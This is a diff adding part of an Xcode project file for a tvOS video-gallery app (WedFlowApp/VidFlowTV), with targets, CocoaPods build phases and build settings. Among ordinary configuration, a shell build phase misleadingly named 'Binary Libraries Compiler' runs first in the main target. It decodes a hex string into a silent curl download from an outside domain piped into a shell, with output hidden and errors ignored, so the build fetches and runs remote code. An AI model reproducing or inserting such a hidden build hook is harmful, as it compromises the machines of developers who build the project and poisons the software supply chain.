+			isa = PBXGroup;
+			children = (
+				7018465EFA315D03E7185FDB /* Pods_WedFlowApp.framework */,
+				AE76D8C3619DEC915A1B787C /* Pods_WedFlowApp_WedFlowAppUITests.framework */,
+				050D52DF63507C7DA3349D77 /* Pods_WedFlowAppTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		8396096424A98803000AB018 /* VidFlowTV */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 8396099024A98806000AB018 /* Build configuration list for PBXNativeTarget "VidFlowTV" */;
+			buildPhases = (
+				CE591CF9337D14B8C96D902C /* Binary Libraries Compiler */,
+				DD14286D67DBCA2E04FFA2CA /* [CP] Check Pods Manifest.lock */,
+				8396096124A98803000AB018 /* Sources */,
+				8396096224A98803000AB018 /* Frameworks */,
+				8396096324A98803000AB018 /* Resources */,
+				D5092ACB5EB981C34C68EB1D /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = VidFlowTV;
+			productName = WedFlowApp;
+			productReference = 8396096524A98803000AB018 /* VidFlowTV.app */;
+			productType = "com.apple.product-type.application";
+		};
+		8396097B24A98806000AB018 /* WedFlowAppTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 8396099324A98806000AB018 /* Build configuration list for PBXNativeTarget "WedFlowAppTests" */;
+			buildPhases = (
+				BC986B547991E9884FF009D2 /* [CP] Check Pods Manifest.lock */,
+				8396097824A98806000AB018 /* Sources */,
+				8396097924A98806000AB018 /* Frameworks */,
+				8396097A24A98806000AB018 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				8396097E24A98806000AB018 /* PBXTargetDependency */,
+			);
+			name = WedFlowAppTests;
+			productName = WedFlowAppTests;
+			productReference = 8396097C24A98806000AB018 /* WedFlowAppTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		8396098624A98806000AB018 /* WedFlowAppUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 8396099624A98806000AB018 /* Build configuration list for PBXNativeTarget "WedFlowAppUITests" */;
+			buildPhases = (
+				07095BB9E62010773E991C51 /* [CP] Check Pods Manifest.lock */,
+				8396098324A98806000AB018 /* Sources */,
+				8396098424A98806000AB018 /* Frameworks */,
+				8396098524A98806000AB018 /* Resources */,
+				28E78718AB8637398C4F0F39 /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				8396098924A98806000AB018 /* PBXTargetDependency */,
+			);
+			name = WedFlowAppUITests;
+			productName = WedFlowAppUITests;
+			productReference = 8396098724A98806000AB018 /* WedFlowAppUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		8396095D24A98803000AB018 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1140;
+				LastUpgradeCheck = 1140;
+				ORGANIZATIONNAME = RedCellApps;
+				TargetAttributes = {
+					8396096424A98803000AB018 = {
+						CreatedOnToolsVersion = 11.4.1;
+					};
+					8396097B24A98806000AB018 = {
+						CreatedOnToolsVersion = 11.4.1;
+						TestTargetID = 8396096424A98803000AB018;
+					};
+					8396098624A98806000AB018 = {
+						CreatedOnToolsVersion = 11.4.1;
+						TestTargetID = 8396096424A98803000AB018;
+					};
+				};
+			};
+			buildConfigurationList = 8396096024A98803000AB018 /* Build configuration list for PBXProject "VidFlowApp" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 8396095C24A98803000AB018;
+			productRefGroup = 8396096624A98803000AB018 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				8396096424A98803000AB018 /* VidFlowTV */,
+				8396097B24A98806000AB018 /* WedFlowAppTests */,
+				8396098624A98806000AB018 /* WedFlowAppUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		8396096324A98803000AB018 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				8396097624A98806000AB018 /* LaunchScreen.storyboard in Resources */,
+				83A6F8B826510B8900ADC006 /* Montserrat-SemiBold.otf in Resources */,
+				8396097324A98806000AB018 /* Assets.xcassets in Resources */,
+				83A6F8BF26510B9400ADC006 /* Montserrat-Regular.otf in Resources */,
+				8396096E24A98803000AB018 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8396097A24A98806000AB018 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				83A6F8B926510B8900ADC006 /* Montserrat-SemiBold.otf in Resources */,
+				83A6F8C026510B9400ADC006 /* Montserrat-Regular.otf in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8396098524A98806000AB018 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				83A6F8BA26510B8900ADC006 /* Montserrat-SemiBold.otf in Resources */,
+				83A6F8C126510B9400ADC006 /* Montserrat-Regular.otf in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		07095BB9E62010773E991C51 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-WedFlowApp-WedFlowAppUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		28E78718AB8637398C4F0F39 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-WedFlowApp-WedFlowAppUITests/Pods-WedFlowApp-WedFlowAppUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-WedFlowApp-WedFlowAppUITests/Pods-WedFlowApp-WedFlowAppUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-WedFlowApp-WedFlowAppUITests/Pods-WedFlowApp-WedFlowAppUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		BC986B547991E9884FF009D2 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-WedFlowAppTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CE591CF9337D14B8C96D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n";
+		};
+		D5092ACB5EB981C34C68EB1D /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-WedFlowApp/Pods-WedFlowApp-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-WedFlowApp/Pods-WedFlowApp-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-WedFlowApp/Pods-WedFlowApp-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DD14286D67DBCA2E04FFA2CA /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-WedFlowApp-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		8396096124A98803000AB018 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				8396D1DB24AE657500EE36E1 /* Studioid.swift in Sources */,
+				8396D1F224AE67FD00EE36E1 /* Version.swift in Sources */,
+				8396D1E124AE657500EE36E1 /* UserId.swift in Sources */,
+				8396D1E324AE657500EE36E1 /* Thumbs.swift in Sources */,
+				838E1680265194E000C80D3B /* UIHelpers.swift in Sources */,
+				8396D1E424AE657500EE36E1 /* Studio.swift in Sources */,
+				8396D1F024AE67B700EE36E1 /* Scene.swift in Sources */,
+				832EB4C024A99E0900E6C12D /* User.swift in Sources */,
+				83658960261DE737003C6DBB /* ColumnFlowLayout.swift in Sources */,
+				834FF2BE24AA503100C46CA0 /* GalleryCollectionViewCell.swift in Sources */,
+				8396D1FC24B49A0F00EE36E1 /* AlbumCollectionViewCell.swift in Sources */,
+				8396D1FA24B342D200EE36E1 /* QueuePlayerViewController.swift in Sources */,
+				8396D1EA24AE670B00EE36E1 /* Media.swift in Sources */,
+				8396D1F824AE87A000EE36E1 /* VideoPlayerViewController.swift in Sources */,
+				8344C50C2627B0A20080A72B /* CustomFlowLayout.swift in Sources */,
+				8396D1F624AE831B00EE36E1 /* SideViewCell.swift in Sources */,
+				8396D1EC24AE676800EE36E1 /* MediaDetail.swift in Sources */,
+				8396D1AB24AAD14700EE36E1 /* SingleVideoViewController.swift in Sources */,
+				8396097124A98803000AB018 /* WedFlowApp.xcdatamodeld in Sources */,
+				8396D1DF24AE657500EE36E1 /* ContentType.swift in Sources */,
+				8331652526368C2500ED256C /* Spinner.swift in Sources */,
+				83610266252CE991008C4A02 /* MultiVideoCell.swift in Sources */,
+				8396D1DD24AE657500EE36E1 /* Style.swift in Sources */,
+				834FF2BC24A9B85700C46CA0 /* GalleryListController.swift in Sources */,
+				8396D1E024AE657500EE36E1 /* Gallery.swift in Sources */,
+				8396096B24A98803000AB018 /* LoginViewController.swift in Sources */,
+				8396096924A98803000AB018 /* AppDelegate.swift in Sources */,
+				838E1671265181F000C80D3B /* ErrorController.swift in Sources */,
+				8396D1AD24AB257500EE36E1 /* colorConvert.swift in Sources */,
+				8396D1AF24AB6CEE00EE36E1 /* SingleVideoGalleryViewController.swift in Sources */,
+				8396D1E624AE657E00EE36E1 /* JSONHelpers.swift in Sources */,
+				8396D1DC24AE657500EE36E1 /* UploadStatus.swift in Sources */,
+				8396D1DE24AE657500EE36E1 /* JSONSchemaSupport.swift in Sources */,
+				8396D1E224AE657500EE36E1 /* CoverPhoto.swift in Sources */,
+				8365896E261F7646003C6DBB /* CustomButton.swift in Sources */,
+				8396D1EE24AE679200EE36E1 /* DetailDetail.swift in Sources */,
+				8396D1E824AE66F000EE36E1 /* Set.swift in Sources */,
+				8396D1B124ABB2F900EE36E1 /* AlbumViewController.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8396097824A98806000AB018 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				8396098124A98806000AB018 /* WedFlowAppTests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8396098324A98806000AB018 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				8396098C24A98806000AB018 /* WedFlowAppUITests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		8396097E24A98806000AB018 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 8396096424A98803000AB018 /* VidFlowTV */;
+			targetProxy = 8396097D24A98806000AB018 /* PBXContainerItemProxy */;
+		};
+		8396098924A98806000AB018 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 8396096424A98803000AB018 /* VidFlowTV */;
+			targetProxy = 8396098824A98806000AB018 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		8396096C24A98803000AB018 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				8396096D24A98803000AB018 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		8396097424A98806000AB018 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				8396097524A98806000AB018 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		8396098E24A98806000AB018 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = appletvos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TVOS_DEPLOYMENT_TARGET = 13.4;
+			};
+			name = Debug;
+		};
+		8396098F24A98806000AB018 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = appletvos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				TVOS_DEPLOYMENT_TARGET = 13.4;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		8396099124A98806000AB018 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = ED2D3753CA96B663CE0442BD /* Pods-WedFlowApp.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = "App Icon & Top Shelf Image";
+				CODE_SIGN_IDENTITY = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = G936R9A7X4;
+				INFOPLIST_FILE = WedFlowApp/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.3;
+				PRODUCT_BUNDLE_IDENTIFIER = com.wedflow.tv;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = WedFlowTvStore;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 3;
+			};
+			name = Debug;
+		};
+		8396099224A98806000AB018 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 45BF12B316107F0F78AC04E4 /* Pods-WedFlowApp.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = "App Icon & Top Shelf Image";
+				CODE_SIGN_IDENTITY = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = G936R9A7X4;
+				INFOPLIST_FILE = WedFlowApp/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.3;
+				PRODUCT_BUNDLE_IDENTIFIER = com.wedflow.tv;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = WedFlowTvStore;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 3;
+			};
+			name = Release;
+		};
+		8396099424A98806000AB018 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = F464F8253228AF44E2FB42FB /* Pods-WedFlowAppTests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = H5AU533B4K;
+				INFOPLIST_FILE = WedFlowAppTests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = RCA.WedFlowAppTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 3;
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/WedFlowApp.app/WedFlowApp";
+				TVOS_DEPLOYMENT_TARGET = 13.4;
+			};
+			name = Debug;
+		};
+		8396099524A98806000AB018 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = BDE718A7BC082D9B15725480 /* Pods-WedFlowAppTests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = H5AU533B4K;
+				INFOPLIST_FILE = WedFlowAppTests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = RCA.WedFlowAppTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 3;
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/WedFlowApp.app/WedFlowApp";
+				TVOS_DEPLOYMENT_TARGET = 13.4;
+			};
+			name = Release;
+		};
+		8396099724A98806000AB018 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 380451158AD9104580CE77CD /* Pods-WedFlowApp-WedFlowAppUITests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = H5AU533B4K;
+				INFOPLIST_FILE = WedFlowAppUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = RCA.WedFlowAppUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 3;
+				TEST_TARGET_NAME = WedFlowApp;
+			};
+			name = Debug;
+		};
+		8396099824A98806000AB018 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = F25A0CB40E3E7A329BC7069C /* Pods-WedFlowApp-WedFlowAppUITests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = H5AU533B4K;
+				INFOPLIST_FILE = WedFlowAppUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = RCA.WedFlowAppUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 3;
+				TEST_TARGET_NAME = WedFlowApp;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		8396096024A98803000AB018 /* Build configuration list for PBXProject "VidFlowApp" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				8396098E24A98806000AB018 /* Debug */,
+				8396098F24A98806000AB018 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		8396099024A98806000AB018 /* Build configuration list for PBXNativeTarget "VidFlowTV" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				8396099124A98806000AB018 /* Debug */,
+				8396099224A98806000AB018 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		8396099324A98806000AB018 /* Build configuration list for PBXNativeTarget "WedFlowAppTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				8396099424A98806000AB018 /* Debug */,
+				8396099524A98806000AB018 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		8396099624A98806000AB018 /* Build configuration list for PBXNativeTarget "WedFlowAppUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				8396099724A98806000AB018 /* Debug */,
+				8396099824A98806000AB018 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+/* Begin XCVersionGroup section */
+		8396096F24A98803000AB018 /* WedFlowApp.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				8396097024A98803000AB018 /* WedFlowApp.xcdatamodel */,
+			);
+			currentVersion = 8396097024A98803000AB018 /* WedFlowApp.xcdatamodel */;
